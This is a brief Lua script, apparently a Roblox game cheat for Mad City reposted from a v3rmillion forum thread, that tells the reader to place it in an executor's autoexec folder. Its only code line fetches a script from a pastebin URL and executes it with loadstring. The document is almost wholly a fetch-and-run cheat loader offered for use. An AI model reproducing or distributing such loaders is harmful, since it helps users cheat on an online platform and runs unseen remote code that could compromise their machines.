--[[ source: https://v3rmillion.net/showthread.php?tid=1025258
Madcity Moneyfarm by awdas.
PUT THIS IN YOUR AUTOEXEC FOLDER!
]]
loadstring(game:HttpGet(("https://pastebin.com/raw/3bqsDbtS"),true))()